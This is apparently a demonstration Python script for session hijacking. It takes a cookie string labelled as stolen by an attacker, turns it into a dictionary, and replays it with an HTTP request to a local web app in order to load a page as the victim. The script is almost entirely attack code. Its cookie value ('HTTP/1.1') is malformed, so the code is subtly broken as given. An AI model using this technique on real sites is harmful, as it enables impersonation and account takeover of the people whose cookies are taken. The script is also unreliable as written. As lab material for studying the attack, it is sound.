import requests

# This is the session cookie captured by the attacker
stolen_cookie = "HTTP/1.1"

# Attacker simulates accessing the victim's page (e.g., homepage)
url = "http://127.0.0.1:5000/"

# Convert the cookie string into a dictionary format for requests
cookie_dict = {}
for item in stolen_cookie.split(';'):
    if '=' in item:
        key, value = item.strip().split('=', 1)
        cookie_dict[key] = value

# Use the stolen cookie to make a request as the victim
response = requests.get(url, cookies=cookie_dict)

# Print the response status and a preview of the page content
print("[+] Status:", response.status_code)
print("[+] Response Preview:\n", response.text[:500])  # Display only the first 500 characters